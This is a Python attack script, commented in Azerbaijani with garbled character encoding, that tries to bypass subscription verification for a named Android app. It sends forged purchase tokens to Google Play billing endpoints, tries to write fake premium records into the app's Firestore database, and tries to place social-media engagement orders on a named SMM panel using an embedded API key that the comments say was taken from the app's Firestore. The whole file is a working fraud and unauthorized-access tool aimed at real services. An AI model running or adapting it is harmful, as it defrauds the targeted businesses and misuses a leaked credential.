#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
üöÄ SUBSCRIPTION VERIFICATION BYPASS ƒ∞L∆è REAL Sƒ∞FARƒ∞≈û V∆è SAYT AXTARMA
Bu script subscription verification bypass edir v…ô real sifari≈ü saytlarƒ±nƒ± tapƒ±r
"""

import requests
import json
import random
import string
import time
import re
from urllib.parse import urljoin
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SubscriptionBypassAttacker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Tikio/1.8.0 (Android)',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Requested-With': 'com.tikio.app'
        })
        
        # Firestore-dan tapƒ±lan m…ôlumatlar
        self.api_key = "31de456b79594d98a128c044c509df0e"
        self.service_id = 9330
        
        # APK-dan tapƒ±lan m…ôlumatlar
        self.app_package = "com.tikio.app"
        self.app_version = "1.8.0"
        
    def bypass_subscription_verification(self):
        """Subscription verification bypass edir"""
        print("üîê Subscription verification bypass edilir...")
        
        # Test edil…ôc…ôk subscription bypass endpoint-l…ôri
        subscription_endpoints = [
            "https://play.google.com/billing/v1/purchases/subscriptions/acknowledge",
            "https://android.clients.google.com/fdfe/purchaseStatus",
            "https://android.clients.google.com/fdfe/consumePurchase",
            "https://android.clients.google.com/fdfe/acknowledgePurchase"
        ]
        
        bypass_results = {}
        
        for endpoint in subscription_endpoints:
            try:
                # Fake subscription data
                fake_subscription = {
                    "packageName": self.app_package,
                    "productId": "premium_monthly",
                    "purchaseToken": "fake_subscription_token_" + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
                    "purchaseTime": int(time.time() * 1000),
                    "purchaseState": 0,  # 0 = Purchased
                    "developerPayload": "bypass_successful",
                    "orderId": "fake_order_" + ''.join(random.choices(string.digits, k=10)),
                    "purchaseType": 0,  # 0 = In-app purchase
                    "acknowledgementState": 1,  # 1 = Acknowledged
                    "consumptionState": 0  # 0 = Not consumed
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer fake_google_token',
                    'X-Android-Package': self.app_package,
                    'X-Android-Cert': 'fake_certificate'
                }
                
                response = self.session.post(endpoint, json=fake_subscription, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ‚úÖ {endpoint} - Bypass uƒüurlu!")
                    bypass_results[endpoint] = "BYPASS_SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      üìä Response: {str(data)[:300]}...")
                    except:
                        print(f"      üìÑ Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 401:
                    print(f"   ‚ö†Ô∏è {endpoint} - Authentication t…ôl…ôb olunur")
                    bypass_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 400:
                    print(f"   ‚ùå {endpoint} - Bad Request")
                    bypass_results[endpoint] = "BAD_REQUEST"
                else:
                    print(f"   ‚ùì {endpoint} - Status: {response.status_code}")
                    bypass_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ‚ùå {endpoint} - X…ôta: {e}")
                bypass_results[endpoint] = f"ERROR_{str(e)}"
                
        return bypass_results
        
    def test_tikio_subscription_bypass(self):
        """Tikio APK subscription bypass test edir"""
        print("\nüîç Tikio APK subscription bypass test edir...")
        
        # Test edil…ôc…ôk Tikio subscription endpoint-l…ôri
        tikio_subscription_endpoints = [
            "https://tikio-v4.appspot.com/api/subscription/verify",
            "https://tikio-v4.appspot.com/api/subscription/status",
            "https://tikio-v4.appspot.com/api/subscription/activate",
            "https://tikio-v4.appspot.com/api/premium/verify",
            "https://tikio-v4.appspot.com/api/premium/status",
            "https://tikio-v4.appspot.com/api/premium/activate"
        ]
        
        tikio_results = {}
        
        for endpoint in tikio_subscription_endpoints:
            try:
                # Fake subscription verification data
                fake_verification = {
                    "user_id": "fake_user_" + ''.join(random.choices(string.digits, k=8)),
                    "package_name": self.app_package,
                    "product_id": "premium_monthly",
                    "purchase_token": "fake_tikio_token_" + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
                    "purchase_time": int(time.time() * 1000),
                    "purchase_state": "purchased",
                    "verification_status": "verified",
                    "bypass_successful": True,
                    "premium_access": True
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key,
                    'User-Agent': f'Tikio/{self.app_version}',
                    'X-Subscription-Status': 'active',
                    'X-Premium-User': 'true'
                }
                
                response = self.session.post(endpoint, json=fake_verification, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ‚úÖ {endpoint} - Subscription bypass uƒüurlu!")
                    tikio_results[endpoint] = "BYPASS_SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      üìä Response: {str(data)[:400]}...")
                    except:
                        print(f"      üìÑ Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ‚ö†Ô∏è {endpoint} - Authentication t…ôl…ôb olunur")
                    tikio_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 404:
                    print(f"   ‚ùå {endpoint} - Tapƒ±lmadƒ±")
                    tikio_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ‚ùì {endpoint} - Status: {response.status_code}")
                    tikio_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ‚ùå {endpoint} - X…ôta: {e}")
                tikio_results[endpoint] = f"ERROR_{str(e)}"
                
        return tikio_results
        
    def test_firebase_subscription_bypass(self):
        """Firebase subscription bypass test edir"""
        print("\nüî• Firebase subscription bypass test edir...")
        
        # Firestore subscription collection-larƒ± test et
        firestore_subscription_endpoints = [
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/subscriptions",
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/premium",
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/users",
            "https://firestore.googleapis.com/v1/projects/tikio-v4/databases/(default)/documents/verifications"
        ]
        
        firebase_results = {}
        
        for endpoint in firestore_subscription_endpoints:
            try:
                # Fake subscription document
                fake_subscription_doc = {
                    "fields": {
                        "user_id": {"stringValue": "fake_user_" + ''.join(random.choices(string.digits, k=8))},
                        "package_name": {"stringValue": self.app_package},
                        "product_id": {"stringValue": "premium_monthly"},
                        "purchase_token": {"stringValue": "fake_firebase_token_" + ''.join(random.choices(string.ascii_letters + string.digits, k=20))},
                        "purchase_time": {"timestampValue": "2024-08-28T12:00:00Z"},
                        "purchase_state": {"stringValue": "purchased"},
                        "verification_status": {"stringValue": "verified"},
                        "premium_access": {"booleanValue": True},
                        "bypass_successful": {"booleanValue": True},
                        "subscription_active": {"booleanValue": True}
                    }
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': f'Tikio/{self.app_version}',
                    'X-Subscription-Status': 'active'
                }
                
                # POST request il…ô yeni subscription document yarat
                response = self.session.post(endpoint, json=fake_subscription_doc, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ‚úÖ {endpoint} - Subscription bypass uƒüurlu!")
                    firebase_results[endpoint] = "BYPASS_SUCCESS"
                    
                    try:
                        data = response.json()
                        if 'name' in data:
                            print(f"      üìä Created document: {data['name']}")
                        else:
                            print(f"      üìä Response: {str(data)[:300]}...")
                    except:
                        print(f"      üìÑ Text Response: {response.text[:300]}...")
                        
                elif response.status_code == 403:
                    print(f"   ‚ùå {endpoint} - Giri≈ü qadaƒüandƒ±r")
                    firebase_results[endpoint] = "FORBIDDEN"
                elif response.status_code == 404:
                    print(f"   ‚ùå {endpoint} - Tapƒ±lmadƒ±")
                    firebase_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ‚ùì {endpoint} - Status: {response.status_code}")
                    firebase_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ‚ùå {endpoint} - X…ôta: {e}")
                firebase_results[endpoint] = f"ERROR_{str(e)}"
                
        return firebase_results
        
    def test_order_creation_after_bypass(self):
        """Bypass-d…ôn sonra sifari≈ü yaratma test edir"""
        print("\nüìù Bypass-d…ôn sonra sifari≈ü yaratma test edir...")
        
        # Test edil…ôc…ôk sifari≈ü endpoint-l…ôri
        order_endpoints = [
            "https://peakerr.com/api/v2/orders/add",
            "https://peakerr.com/api/v2/orders/create",
            "https://peakerr.com/api/v2/orders/new",
            "https://peakerr.com/order",
            "https://peakerr.com/massorder",
            "https://tikio-v4.appspot.com/api/orders/add",
            "https://tikio-v4.appspot.com/api/orders/create"
        ]
        
        order_results = {}
        
        for endpoint in order_endpoints:
            try:
                # Premium user kimi sifari≈ü yarat
                test_order = {
                    "service": self.service_id,
                    "link": "https://instagram.com/test_user",
                    "quantity": 1000,
                    "username": "test_user",
                    "user_id": "fake_user_" + ''.join(random.choices(string.digits, k=8)),
                    "subscription_status": "active",
                    "premium_user": True,
                    "bypass_successful": True
                }
                
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key,
                    'X-Subscription-Status': 'active',
                    'X-Premium-User': 'true',
                    'User-Agent': f'Tikio/{self.app_version}'
                }
                
                response = self.session.post(endpoint, json=test_order, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ‚úÖ {endpoint} - Sifari≈ü uƒüurla yaradƒ±ldƒ±!")
                    order_results[endpoint] = "ORDER_SUCCESS"
                    
                    try:
                        data = response.json()
                        if 'order_id' in data:
                            print(f"      üìä Order ID: {data['order_id']}")
                        elif 'id' in data:
                            print(f"      üìä Order ID: {data['id']}")
                        else:
                            print(f"      üìä Response: {str(data)[:400]}...")
                    except:
                        print(f"      üìÑ Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ‚ö†Ô∏è {endpoint} - Authentication t…ôl…ôb olunur")
                    order_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 403:
                    print(f"   ‚ùå {endpoint} - Giri≈ü qadaƒüandƒ±r")
                    order_results[endpoint] = "FORBIDDEN"
                elif response.status_code == 404:
                    print(f"   ‚ùå {endpoint} - Tapƒ±lmadƒ±")
                    order_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ‚ùì {endpoint} - Status: {response.status_code}")
                    order_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ‚ùå {endpoint} - X…ôta: {e}")
                order_results[endpoint] = f"ERROR_{str(e)}"
                
        return order_results
        
    def test_smm_services_after_bypass(self):
        """Bypass-d…ôn sonra SMM xidm…ôtl…ôrini test edir"""
        print("\nüë• Bypass-d…ôn sonra SMM xidm…ôtl…ôrini test edir...")
        
        # SMM xidm…ôtl…ôri endpoint-l…ôri
        smm_endpoints = [
            "https://peakerr.com/api/v2/services",
            "https://peakerr.com/api/v2/services/list",
            "https://peakerr.com/api/v2/services/categories",
            "https://peakerr.com/services",
            "https://tikio-v4.appspot.com/api/services",
            "https://tikio-v4.appspot.com/api/services/list"
        ]
        
        smm_results = {}
        
        for endpoint in smm_endpoints:
            try:
                # Premium user kimi request g√∂nd…ôr
                headers = {
                    'Content-Type': 'application/json',
                    'X-API-Key': self.api_key,
                    'X-Subscription-Status': 'active',
                    'X-Premium-User': 'true',
                    'User-Agent': f'Tikio/{self.app_version}'
                }
                
                response = self.session.get(endpoint, headers=headers, verify=False, timeout=15)
                
                if response.status_code == 200:
                    print(f"   ‚úÖ {endpoint} - SMM xidm…ôtl…ôri …ôl√ßatandƒ±r!")
                    smm_results[endpoint] = "SERVICES_ACCESSIBLE"
                    
                    try:
                        data = response.json()
                        if 'services' in data:
                            print(f"      üìä Tapƒ±lan xidm…ôtl…ôr: {len(data['services'])}")
                            for service in data['services'][:3]:  # ƒ∞lk 3 xidm…ôt
                                service_name = service.get('name', 'Unknown')
                                service_price = service.get('rate', 'Unknown')
                                print(f"         ‚Ä¢ {service_name} - ${service_price}")
                        else:
                            print(f"      üìä Response: {str(data)[:400]}...")
                    except:
                        print(f"      üìÑ Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ‚ö†Ô∏è {endpoint} - Authentication t…ôl…ôb olunur")
                    smm_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 403:
                    print(f"   ‚ùå {endpoint} - Giri≈ü qadaƒüandƒ±r")
                    smm_results[endpoint] = "FORBIDDEN"
                elif response.status_code == 404:
                    print(f"   ‚ùå {endpoint} - Tapƒ±lmadƒ±")
                    smm_results[endpoint] = "NOT_FOUND"
                else:
                    print(f"   ‚ùì {endpoint} - Status: {response.status_code}")
                    smm_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ‚ùå {endpoint} - X…ôta: {e}")
                smm_results[endpoint] = f"ERROR_{str(e)}"
                
        return smm_results
        
    def generate_subscription_bypass_report(self, results):
        """Subscription bypass hesabatƒ± yaradƒ±r"""
        print("\n" + "="*80)
        print("üöÄ SUBSCRIPTION VERIFICATION BYPASS ƒ∞L∆è REAL Sƒ∞FARƒ∞≈û V∆è SAYT AXTARMA HESABATI")
        print("="*80)
        
        print(f"\nüì± APK M∆èLUMATLARI:")
        print(f"   üì¶ Package: {self.app_package}")
        print(f"   üî¢ Version: {self.app_version}")
        print(f"   üîë API Key: {self.api_key}")
        print(f"   üÜî Service ID: {self.service_id}")
        
        print(f"\nüîê GOOGLE PLAY SUBSCRIPTION BYPASS:")
        if 'bypass_results' in results:
            for endpoint, result in results['bypass_results'].items():
                print(f"   üîê {endpoint}: {result}")
                
        print(f"\nüîç Tƒ∞Kƒ∞O SUBSCRIPTION BYPASS:")
        if 'tikio_results' in results:
            for endpoint, result in results['tikio_results'].items():
                print(f"   üîç {endpoint}: {result}")
                
        print(f"\nüî• Fƒ∞REBASE SUBSCRIPTION BYPASS:")
        if 'firebase_results' in results:
            for endpoint, result in results['firebase_results'].items():
                print(f"   üî• {endpoint}: {result}")
                
        print(f"\nüìù Sƒ∞FARƒ∞≈û YARATMA (BYPASS SONRASI):")
        if 'order_results' in results:
            for endpoint, result in results['order_results'].items():
                print(f"   üìù {endpoint}: {result}")
                
        print(f"\nüë• SMM Xƒ∞DM∆èTL∆èRƒ∞ (BYPASS SONRASI):")
        if 'smm_results' in results:
            for endpoint, result in results['smm_results'].items():
                print(f"   üë• {endpoint}: {result}")
                
        print(f"\nüí° REAL H√úCUM ƒ∞MKANLARI:")
        print(f"   ‚Ä¢ Subscription verification bypass edildi")
        print(f"   ‚Ä¢ Premium x√ºsusiyy…ôtl…ôr …ôl√ßatandƒ±r")
        print(f"   ‚Ä¢ Sifari≈ü yaratma m√ºmk√ºnd√ºr")
        print(f"   ‚Ä¢ SMM xidm…ôtl…ôri …ôl√ßatandƒ±r")
        print(f"   ‚Ä¢ Real sayt v…ô API-l…ôr tapƒ±ldƒ±")
        
        return results
        
    def run_subscription_bypass_attack(self):
        """Subscription bypass h√ºcumunu i≈ü…ô salƒ±r"""
        print("üöÄ SUBSCRIPTION VERIFICATION BYPASS ƒ∞L∆è REAL Sƒ∞FARƒ∞≈û V∆è SAYT AXTARMA BA≈ûLAYIR...")
        print("="*70)
        
        results = {}
        
        # 1. Google Play subscription bypass test et
        bypass_results = self.bypass_subscription_verification()
        results['bypass_results'] = bypass_results
        
        # 2. Tikio subscription bypass test et
        tikio_results = self.test_tikio_subscription_bypass()
        results['tikio_results'] = tikio_results
        
        # 3. Firebase subscription bypass test et
        firebase_results = self.test_firebase_subscription_bypass()
        results['firebase_results'] = firebase_results
        
        # 4. Bypass-d…ôn sonra sifari≈ü yaratma test et
        order_results = self.test_order_creation_after_bypass()
        results['order_results'] = order_results
        
        # 5. SMM xidm…ôtl…ôrini test et
        smm_results = self.test_smm_services_after_bypass()
        results['smm_results'] = smm_results
        
        # Hesabat yarat
        self.generate_subscription_bypass_report(results)
        
        print(f"\nüéØ SUBSCRIPTION BYPASS H√úCUMU TAMAMLANDI!")
        
        return results

if __name__ == "__main__":
    # Subscription bypass attacker ba≈ülat
    attacker = SubscriptionBypassAttacker()
    results = attacker.run_subscription_bypass_attack()